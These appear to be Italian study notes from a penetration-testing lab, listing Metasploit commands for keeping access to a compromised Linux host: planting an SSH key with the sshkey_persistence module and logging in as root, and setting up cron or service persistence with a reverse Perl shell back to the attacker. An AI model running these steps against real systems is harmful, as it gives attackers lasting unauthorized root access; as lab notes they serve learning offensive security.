1. `search platform:linux persistence` trova i moduli per stabilire una persistenza
2. `use post/linux/manage/sshkey_persistence` **IL MIGLIORE** utilizziamo le chiavi private per accedere al target
    - **set CREATESSHFOLDER true**
    - **set SESSION**
3. `loot`
4. `cat PATH.txt` copiamo la chiave rsa che ci ah fornito il modulo
5. **`exit`** usciamo da msfconsole
6. `nano ssh_key` copiamo nel file nano la chiave rsa
7. `chmod 0400 ssh_key` gli diamo questi privilegi
8. `ssh -i ssh_key root@IP_TARGET`

---

- `exploit/linux/local/cron_persistence` modulo consigliato ma nell’esempio non funziona
    - **set payload payload/cmd/unix/reverse_perl**
    - **set session**
    - **set lport 1234**
    - **set lhost eth1**

---

- `exploit/linux/local/service_persistence`
    - **info** per vedere le versioni che supporta
    - **set payload** premiamo tab per vedere i payload che possiamo utilizzare
